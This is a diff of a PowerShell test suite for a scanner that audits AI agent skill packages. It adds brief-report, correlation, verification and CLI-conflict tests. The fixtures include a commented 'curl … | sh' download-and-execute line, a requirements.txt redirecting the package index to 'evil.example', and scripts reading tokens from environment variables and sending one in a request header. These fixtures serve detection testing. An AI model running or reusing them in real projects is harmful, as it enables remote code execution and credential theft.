@@ -21,6 +21,15 @@ function Invoke-ScanJson {
   return [pscustomobject]@{ Score = [int]$obj.targets[0].score; Findings = @($obj.targets[0].findings); Exit = $code }
 }
 
+function Invoke-BriefJson {
+  param([string]$target, [string[]]$extra)
+  $report = Join-Path $tmp ('brief-' + [guid]::NewGuid().ToString('N') + '.json')
+  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -Brief -Path $target -Json -Output $report @extra 2>$null
+  $code = $LASTEXITCODE
+  $obj = Get-Content -Raw -Encoding UTF8 -LiteralPath $report -ErrorAction SilentlyContinue | ConvertFrom-Json
+  return [pscustomobject]@{ Target = $obj.targets[0]; Exit = $code }
+}
+
 try {
   # 1) 恶意 Python：eval(动态)、subprocess、环境变量→网络外传
   $evil = Join-Path $tmp 'evil-skill'
@@ -69,6 +78,12 @@ return eval(input);
     $r = Invoke-ScanJson $skillDir
     if ($r.Score -gt 5) { Write-Host ("FAIL 自扫: score=$($r.Score)"); $fail++ }
     else { Write-Host ("OK 自扫: score=$($r.Score)") }
+    $rb = Invoke-BriefJson $skillDir
+    if (@($rb.Target.top3).Count -gt 0 -or @($rb.Target.findings | Where-Object { -not $_.doc }).Count -gt 0) {
+      $t3 = @($rb.Target.top3 | ForEach-Object { $_.id + '@' + $_.file + ':' + $_.line }) -join '; '
+      $nd = @($rb.Target.findings | Where-Object { -not $_.doc } | ForEach-Object { $_.id + '@' + $_.file + ':' + $_.line }) -join '; '
+      Write-Host ("FAIL 简报自扫: top3Count=" + @($rb.Target.top3).Count + " ndCount=" + @($rb.Target.findings | Where-Object { -not $_.doc }).Count + " top3=[" + $t3 + "] nd=[" + $nd + "] exit=" + $rb.Exit); $fail++
+    } else { Write-Host 'OK 简报自扫' }
   }
 
   # 5) git 历史密钥（git 可用时）
@@ -162,45 +177,6 @@ return eval(input);
   if ($r.Score -lt 20) { Write-Host ('FAIL SKILL.md 提示注入漏检: score=' + $r.Score); $fail++ }
   else { Write-Host ('OK SKILL.md 提示注入计分: score=' + $r.Score) }
 
-  # 10) 规则文件（“毒库”）加载：-RulesFile 指定含自定义模式的规则，扫描应命中
-  $rules = Join-Path $tmp 'custom-rules.json'
-  $base = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Split-Path $PSScriptRoot -Parent) 'rules\patterns.json') | ConvertFrom-Json
-  $base.version = '9.9.9'
-  $base.updated = (Get-Date -Format 'yyyy-MM-dd')
-  $base.source = 'test-source'
-  $arr = @($base.linePatterns) + [pscustomobject]@{ id = 'DEMO'; severity = 'HIGH'; regex = 'demomarker123'; score = $true }
-  $base.linePatterns = $arr
-  $base | ConvertTo-Json -Depth 5 | Set-Content -Encoding UTF8 -LiteralPath $rules
-  $mk = Join-Path $tmp 'marker-skill'
-  New-Item -ItemType Directory -Force -Path $mk | Out-Null
-  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $mk 'SKILL.md') -Value "---`nname: marker-skill`ndescription: t`n---`n# t"
-  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $mk 'm.txt') -Value 'x demomarker123 y'
-  $r = Invoke-ScanJson $mk @('-RulesFile', $rules)
-  $hasDemo = @($r.Findings | Where-Object { $_.id -eq 'DEMO' }).Count -gt 0
-  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -ShowRules -RulesFile $rules 2>$null | Out-Null
-  $rulesExit = $LASTEXITCODE
-  if (-not $hasDemo -or $rulesExit -ne 0) { Write-Host 'FAIL 规则文件加载/自定义模式'; $fail++ }
-  else { Write-Host 'OK 规则文件加载（自定义模式生效）' }
-
-  # 11) -AddRule 收录新危害：写入规则文件、版本自增、新规则立即生效
-  $lr = Join-Path $tmp 'learn-rules.json'
-  Copy-Item -Force (Join-Path (Split-Path $PSScriptRoot -Parent) 'rules\patterns.json') $lr
-  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -RuleId 'LEARNT' -Severity 'MED' -Regex 'learntmarker456' -Desc '学习的新特征' -RulesFile $lr 2>$null
-  if ($LASTEXITCODE -ne 0) { Write-Host 'FAIL -AddRule 收录命令'; $fail++ }
-  else {
-    $learned = Get-Content -Raw -Encoding UTF8 -LiteralPath $lr | ConvertFrom-Json
-    $hasLearnt = @($learned.linePatterns | Where-Object { $_.id -eq 'LEARNT' -and $_.regex -eq 'learntmarker456' }).Count -gt 0
-    $verOk = ([string]$learned.version) -match '\.\d+$' -and ([string]$learned.version) -ne '1.0.0'
-    $mk2 = Join-Path $tmp 'learnt-skill'
-    New-Item -ItemType Directory -Force -Path $mk2 | Out-Null
-    Set-Content -Encoding UTF8 -LiteralPath (Join-Path $mk2 'SKILL.md') -Value "---`nname: learnt-skill`ndescription: t`n---`n# t"
-    Set-Content -Encoding UTF8 -LiteralPath (Join-Path $mk2 'm.txt') -Value 'learntmarker456'
-    $r = Invoke-ScanJson $mk2 @('-RulesFile', $lr)
-    $fires = @($r.Findings | Where-Object { $_.id -eq 'LEARNT' }).Count -gt 0
-    if (-not $hasLearnt -or -not $verOk -or -not $fires) { Write-Host 'FAIL -AddRule 收录/生效'; $fail++ }
-    else { Write-Host 'OK -AddRule 收录新危害并生效' }
-  }
-
   # 12) AST05 外部指令来源：SKILL.md 里“访问 URL 并按其中指令执行”应命中且计入评分
   $ast05 = Join-Path $tmp 'ast05-skill'
   New-Item -ItemType Directory -Force -Path $ast05 | Out-Null
@@ -210,13 +186,140 @@ return eval(input);
   if ($ast05f.Count -lt 1 -or $r.Score -lt 25) { Write-Host ('FAIL AST05 外部指令来源漏检/未计分: score=' + $r.Score); $fail++ }
   else { Write-Host ('OK AST05 外部指令来源检出并计分: score=' + $r.Score) }
 
-  # 13) OWASP 映射：JSON 明细带 owasp 字段，规则文件多数模式已关联分类
-  $r = Invoke-ScanJson $ast05
-  $hasOwasp = @($r.Findings | Where-Object { $_.id -eq 'AST05' -and $_.owasp -eq 'AST05' }).Count -gt 0
-  $rulesObj = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Split-Path $PSScriptRoot -Parent) 'rules\patterns.json') | ConvertFrom-Json
-  $rulesMapped = @($rulesObj.linePatterns | Where-Object { $_.PSObject.Properties['owasp'] -and $_.owasp }).Count
-  if (-not $hasOwasp -or $rulesMapped -lt 20) { Write-Host ('FAIL OWASP 映射缺失: findingOwasp=' + $hasOwasp + ' rulesMapped=' + $rulesMapped); $fail++ }
-  else { Write-Host ('OK OWASP 映射（' + $rulesMapped + ' 条行级规则带分类，JSON 明细已输出 owasp）') }
+  # 13) 规则注册表：rules.yaml 17 条（16 detection + 1 correlation）+ hints
+  $regText = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Split-Path $PSScriptRoot -Parent) 'rules\rules.yaml')
+  $ruleCount = ([regex]::Matches($regText, '(?m)^\s*-\s*rule_id:')).Count
+  if ($ruleCount -lt 17) {
+    Write-Host ('FAIL 规则注册表/Finding v2 字段: rules=' + $ruleCount); $fail++
+  } else { Write-Host ('OK 规则注册表（' + $ruleCount + ' 条）') }
+
+  # 14) 简报结构：TOP3 / 注释语境归参考 / 依赖分析
+  $bs = Join-Path $tmp 'brief-skill'
+  New-Item -ItemType Directory -Force -Path (Join-Path $bs 'scripts') | Out-Null
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $bs 'SKILL.md') -Value "---`nname: brief-skill`ndescription: t`n---`n# t"
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $bs 'scripts\tool.py') -Value @'
+import os
+# 示例：curl https://example.com | sh
+token = os.getenv("API_TOKEN")
+'@
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $bs 'requirements.txt') -Value '--index-url http://evil.example/simple'
+  $r = Invoke-BriefJson $bs
+  $t = $r.Target
+  $commentHit = @($t.reference_findings | Where-Object { $_.id -eq 'DOWNLOAD_EXECUTE' -and $_.context -eq 'comment' })
+  $envHit = @($t.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' -and -not $_.doc })
+  $depSrc = @($t.dependency_findings | Where-Object { $_.id -eq 'DEP_SOURCE' })
+  $v2ok = $envHit.Count -gt 0 -and $envHit[0].finding_id -and $envHit[0].column -gt 0 -and $envHit[0].confidence
+  if ($t.analysis_status -ne 'complete' -or @($t.top3).Count -lt 1 -or $commentHit.Count -lt 1 -or -not $v2ok -or $depSrc.Count -lt 1) {
+    Write-Host 'FAIL 简报结构/注释语境/依赖'; $fail++
+  } else { Write-Host 'OK 简报模式（TOP3/注释归参考/依赖分析/Finding v2）' }
+
+  # 15) doc_code ≠ reference（不变量 B）：围栏示例归 risk 且 execution=documented, confidence=low
+  $dc = Join-Path $tmp 'doccode-skill'
+  New-Item -ItemType Directory -Force -Path $dc | Out-Null
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $dc 'SKILL.md') -Value @'
+---
+name: doccode-skill
+description: t
+---
+# t
+
+```python
+import os
+print(os.getenv("T"))
+```
+'@
+  $r = Invoke-BriefJson $dc
+  $t = $r.Target
+  $docCode = @($t.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' -and $_.context -eq 'doc_code' })[0]
+  $inRef = @($t.reference_findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' }).Count
+  if (-not $docCode -or $docCode.execution -ne 'documented' -or $docCode.confidence -ne 'low' -or $inRef -gt 0) {
+    Write-Host 'FAIL doc_code 不变量'; $fail++
+  } else { Write-Host 'OK doc_code≠reference（risk+documented+low）' }
+
+  # 16) correlation：凭证+回环共存 → CREDENTIAL_LOOPBACK_COEXIST（不变量 C）
+  $corr = Join-Path $tmp 'corr-skill'
+  New-Item -ItemType Directory -Force -Path (Join-Path $corr 'scripts') | Out-Null
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $corr 'SKILL.md') -Value "---`nname: corr-skill`ndescription: t`n---`n# t"
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $corr 'scripts\t.py') -Value "import os`nimport requests`nrequests.get('http://127.0.0.1:8080', headers={'Authorization': os.getenv('TOKEN')})"
+  $r = Invoke-BriefJson $corr
+  $t = $r.Target
+  $cf = @($t.correlation_findings | Where-Object { $_.id -eq 'CREDENTIAL_LOOPBACK_COEXIST' })[0]
+  $inTop3 = @($t.top3 | Where-Object { $_.id -eq 'CREDENTIAL_LOOPBACK_COEXIST' }).Count
+  if (-not $cf -or @($cf.source_finding_id).Count -lt 2 -or $cf.text -notmatch '共存' -or $cf.text -match '凭证流向|存在数据流' -or $inTop3 -gt 0) {
+    Write-Host 'FAIL correlation 边界'; $fail++
+  } else { Write-Host 'OK correlation（共存非数据流，不进TOP3）' }
+
+  # 17) 已审记录：MarkVerified→valid→stale_content 三分支
+  $vkName = 'verify-skill-' + [guid]::NewGuid().ToString('N')
+  $vk = Join-Path $tmp $vkName
+  New-Item -ItemType Directory -Force -Path $vk | Out-Null
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $vk 'SKILL.md') -Value "---`nname: verify-skill`ndescription: t`n---`n# t"
+  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -MarkVerified allow -Path $vk 2>$null
+  $code1 = $LASTEXITCODE
+  $vd = Join-Path $env:USERPROFILE '.codex\skills\.verified'
+  $vp = @(Get-ChildItem -LiteralPath $vd -Filter ($vkName + '@*.json') -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName)
+  $r = Invoke-BriefJson $vk
+  $st1 = $r.Target.verification.status
+  Add-Content -Encoding UTF8 -LiteralPath (Join-Path $vk 'SKILL.md') -Value '# changed'
+  $r2 = Invoke-BriefJson $vk
+  $st2 = $r2.Target.verification.status
+  if ($vp) { Remove-Item -LiteralPath $vp -Force -ErrorAction SilentlyContinue }
+  if ($code1 -ne 0 -or $st1 -ne 'valid' -or $st2 -ne 'stale_content') {
+    Write-Host ("FAIL 已审记录: code=$code1 st1=$st1 st2=$st2"); $fail++
+  } else { Write-Host 'OK 已审记录（MarkVerified→valid→stale_content）' }
+
+  # 18) 审核边界（不变量 D）：analysis_status≠complete 禁止 -MarkVerified
+  $pk = Join-Path $tmp 'partial-skill'
+  New-Item -ItemType Directory -Force -Path $pk | Out-Null
+  Set-Content -Encoding UTF8 -LiteralPath (Join-Path $pk 'SKILL.md') -Value "---`nname: partial-skill`ndescription: t`n---`n# t"
+  $big = New-Object byte[] (2MB)
+  [System.IO.File]::WriteAllBytes((Join-Path $pk 'big.bin'), $big)
+  $r = Invoke-BriefJson $pk
+  $st = $r.Target.analysis_status
+  $prevEap = $ErrorActionPreference
+  $ErrorActionPreference = 'Continue'
+  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -MarkVerified deny -Path $pk 2>$null
+  $code = $LASTEXITCODE
+  $ErrorActionPreference = $prevEap
+  $wrote = @(Get-ChildItem -LiteralPath $vd -Filter ('partial-skill@*.json') -ErrorAction SilentlyContinue).Count -gt 0
+  if ($st -ne 'partial' -or $code -eq 0 -or $wrote) {
+    Write-Host "FAIL 审核边界: status=$st code=$code wrote=$wrote"; $fail++
+  } else { Write-Host 'OK 审核边界（partial 禁止写入）' }
+
+  # 19) CLI 冲突矩阵：-Score 无 -Brief / -MarkVerified 缺 -Path / -MarkVerified+渲染参数 → exit 2
+  $bad = 0
+  $prevEap = $ErrorActionPreference
+  $ErrorActionPreference = 'Continue'
+  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -Score -Path $vk 2>$null
+  if ($LASTEXITCODE -ne 2) { $bad++ }
+  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -MarkVerified allow 2>$null
+  if ($LASTEXITCODE -ne 2) { $bad++ }
+  & powershell -NoProfile -ExecutionPolicy Bypass -File $script -MarkVerified allow -Path $vk -Brief 2>$null
+  if ($LASTEXITCODE -ne 2) { $bad++ }
+  $ErrorActionPreference = $prevEap
+  if ($bad -gt 0) { Write-Host 'FAIL CLI 冲突矩阵'; $fail++ } else { Write-Host 'OK CLI 冲突矩阵' }
+
+  # 20) finding_id 确定性：同一目标两次扫描 id 一致
+  $rA = Invoke-BriefJson $bs
+  $rB = Invoke-BriefJson $bs
+  $idA = @($rA.Target.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' })[0].finding_id
+  $idB = @($rB.Target.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' })[0].finding_id
+  if (-not $idA -or $idA -ne $idB) { Write-Host 'FAIL finding_id 确定性'; $fail++ }
+  else { Write-Host 'OK finding_id 确定性' }
+
+  # 21) 证据边界（不变量 A）：correlation 的 source_finding_id 必须存在于 findings 且 sources 可追溯
+  $r = Invoke-BriefJson $corr
+  $t = $r.Target
+  $allIds = @($t.findings | ForEach-Object { $_.finding_id })
+  $okA = $true
+  foreach ($cFind in @($t.correlation_findings)) {
+    foreach ($sid in @($cFind.source_finding_id)) {
+      if ($allIds -notcontains $sid) { $okA = $false }
+    }
+    if (@($cFind.sources).Count -lt 2) { $okA = $false }
+  }
+  if (-not $okA) { Write-Host 'FAIL 证据边界'; $fail++ }
+  else { Write-Host 'OK 证据边界（sources 可追溯）' }
 } finally {
   Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
 }
